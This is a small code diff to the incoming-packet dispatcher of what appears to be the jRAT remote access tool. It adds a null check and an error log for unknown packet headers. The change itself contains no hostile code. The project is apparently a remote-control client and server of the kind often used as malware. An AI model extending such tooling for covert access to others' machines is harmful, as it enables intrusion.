@@ -1,6 +1,7 @@
 package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
+import jrat.common.Logger;
 
 import java.util.Set;
 
@@ -19,7 +20,11 @@ public abstract class AbstractIncomingPacket {
 				}
 			}
 			
-            packet.read(con);
+            if (packet != null) {
+                packet.read(con);
+            } else {
+                Logger.err("failed to find packet '" + header + "'");
+            }
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
